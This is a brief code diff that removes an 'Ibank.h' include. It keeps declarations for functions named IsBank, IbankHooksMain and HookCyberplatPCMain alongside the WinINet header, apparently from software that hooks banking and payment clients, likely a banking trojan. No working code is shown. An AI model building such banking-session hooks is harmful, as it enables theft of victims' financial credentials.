@@ -6,8 +6,6 @@
 #include <wininet.h>
 
 
-#include "Ibank.h"
-
 void IsBank( HINTERNET hRequest);
 bool IbankHooksMain();
 bool HookCyberplatPCMain();
